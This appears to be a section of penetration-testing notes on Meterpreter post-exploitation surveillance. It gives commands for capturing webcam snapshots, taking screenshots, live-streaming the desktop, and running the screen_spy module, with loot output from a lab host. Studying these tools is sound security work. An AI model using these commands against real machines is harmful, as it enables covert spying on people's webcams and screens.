# 05 - WireTap

Search Tag(s): #metasploit-framework #command-and-control

## 5.1 - Webcam

### 5.1.1 - Help Menu

```
meterpreter > webcam_snap -h
```

```
meterpreter > webcam_stream -h
```

- List webcams

`meterpreter > webcam_list`

- Taking snapshots from a webcam

`meterpreter > webcam_snap -i <device_ID> -p /path/to/file.png`

## 5.2 - Screenshots

1. Screenshot
 
```
meterpreter > screenshot -h
Usage: screenshot [options]

Grab a screenshot of the current interactive desktop.

OPTIONS:

    -h   Help Banner.
    -p   The JPEG image path (Default: 'jevmzGjE.jpeg')
    -q   The JPEG image quality (Default: '50')
    -v   Automatically view the JPEG image (Default: 'false')

meterpreter > screenshot -p /home/user/pic.jpeg -q 100
```

2. Screenshare

```
meterpreter > screenshare -h
Usage: screenshare [options]

View the current interactive desktop in real time.

OPTIONS:

    -d   The stream duration in seconds (Default: 1800)
    -h   Help Banner.
    -q   The JPEG image quality (Default: '50')
    -s   The stream file path (Default: 'FteINQtk.jpeg')
    -t   The stream player path (Default: tFLOibzd.html)
    -v   Automatically view the stream (Default: 'true')

meterpreter > screenshare
[*] Preparing player...
[*] Opening player at: /home/user/CTslvACC.html
[*] Streaming...
```

3. `screen_spy` post exploitation module

```
msf exploit(multi/handler) > use post/windows/gather/screen_spy

msf post(windows/gather/screen_spy) > options

Module options (post/windows/gather/screen_spy):

   Name              Current Setting  Required  Description
   ----              ---------------  --------  -----------
   COUNT             6                yes       Number of screenshots to collect
   DELAY             5                yes       Interval between screenshots in seconds
   PID                                no        PID to migrate into before taking the screenshots
   RECORD            true             yes       Record all screenshots to disk by saving them to loot
   SESSION                            yes       The session to run this module on
   VIEW_SCREENSHOTS  false            no        View screenshots automatically

msf post(windows/gather/screen_spy) > set count <int>

msf post(windows/gather/screen_spy) > set delay <seconds>

msf post(windows/gather/screen_spy) > set record true

msf post(windows/gather/screen_spy) > set view_screenshots <false | true>

msf post(windows/gather/screen_spy) > set pid [pid]

msf post(windows/gather/screen_spy) > set session <session_id>

msf post(windows/gather/screen_spy) > run
```

Check the screenshots stored in the loot.

```
meterpreter > run post/windows/gather/screen_spy

[*] Capturing 6 screenshots with a delay of 5 seconds
[*] Screen Spying Complete
[*] run loot -t screenspy.screenshot to see file locations of your newly acquired loot

meterpreter > background
[*] Backgrounding session 1...

msf post(windows/gather/screen_spy) > loot -S screenspy.screenshot

Loot
====

host       service  type                  name              content    info        path
----       -------  ----                  ----              -------    ----        ----
10.0.2.15           screenspy.screenshot  screenshot.0.jpg  image/jpg  Screenshot  /root/.msf4/loot/20220515200113_default_10.0.2.15_screenspy.screen_984207.jpg
10.0.2.15           screenspy.screenshot  screenshot.1.jpg  image/jpg  Screenshot  /root/.msf4/loot/20220515200118_default_10.0.2.15_screenspy.screen_091374.jpg
10.0.2.15           screenspy.screenshot  screenshot.2.jpg  image/jpg  Screenshot  /root/.msf4/loot/20220515200123_default_10.0.2.15_screenspy.screen_996060.jpg
10.0.2.15           screenspy.screenshot  screenshot.3.jpg  image/jpg  Screenshot  /root/.msf4/loot/20220515200128_default_10.0.2.15_screenspy.screen_330156.jpg
10.0.2.15           screenspy.screenshot  screenshot.4.jpg  image/jpg  Screenshot  /root/.msf4/loot/20220515200141_default_10.0.2.15_screenspy.screen_723895.jpg
10.0.2.15           screenspy.screenshot  screenshot.5.jpg  image/jpg  Screenshot  /root/.msf4/loot/20220515200153_default_10.0.2.15_screenspy.screen_495403.jpg
```